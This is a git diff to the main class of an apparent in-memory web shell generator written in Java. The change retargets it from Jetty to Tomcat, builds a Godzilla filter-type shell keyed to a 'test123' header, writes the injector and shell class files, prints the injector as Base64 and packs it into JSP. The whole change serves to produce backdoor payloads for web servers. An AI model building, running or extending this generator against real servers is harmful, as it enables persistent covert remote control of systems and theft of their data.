@@ -5,8 +5,12 @@ import com.reajason.javaweb.memsell.jetty.JettyShell;
 import com.reajason.javaweb.memsell.packer.Packer;
 import com.reajason.javaweb.memsell.tomcat.TomcatShell;
 import lombok.SneakyThrows;
+import org.apache.commons.codec.binary.Base64;
 
 import java.io.IOException;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.nio.file.StandardOpenOption;
 
 /**
  * @author ReaJason
@@ -18,7 +22,7 @@ public class GeneratorMain {
 
     public static void main(String[] args) throws IOException {
         ShellConfig shellConfig = ShellConfig.builder()
-                .server(Server.JETTY)
+                .server(Server.TOMCAT)
                 .shellTool(ShellTool.Godzilla)
                 .shellType(Constants.FILTER).build();
         GodzillaConfig godzillaConfig = GodzillaConfig.builder()
@@ -28,9 +32,12 @@ public class GeneratorMain {
                 .headerValue("test123")
                 .build();
         InjectorConfig injectorConfig = new InjectorConfig();
-        byte[] bytes = generate(shellConfig, injectorConfig, godzillaConfig, Packer.INSTANCE.JSP);
-        if (bytes != null) {
-            System.out.println(new String(bytes));
+        GenerateResult generateResult = generate(shellConfig, injectorConfig, godzillaConfig);
+        if (generateResult != null) {
+            Files.write(Paths.get(generateResult.getInjectorClassName() + ".class"), generateResult.getInjectorBytes(), StandardOpenOption.CREATE_NEW);
+            Files.write(Paths.get(generateResult.getShellClassName() + ".class"), generateResult.getShellBytes(), StandardOpenOption.CREATE_NEW);
+            System.out.println(Base64.encodeBase64String(generateResult.getInjectorBytes()));
+            Packer.INSTANCE.JSP.getPacker().pack(generateResult);
         }
     }
 
@@ -54,7 +61,6 @@ public class GeneratorMain {
     public static byte[] generate(ShellConfig shellConfig, InjectorConfig injectorConfig, ShellToolConfig shellToolConfig, Packer.INSTANCE packerInstance) {
         GenerateResult generateResult = generate(shellConfig, injectorConfig, shellToolConfig);
         if (generateResult != null) {
-//            Files.write(Paths.get( injectorConfig.getInjectorClassName() + ".class"), generateResult.getInjectorBytes(), StandardOpenOption.CREATE_NEW);
             return packerInstance.getPacker().pack(generateResult);
         }
         return null;
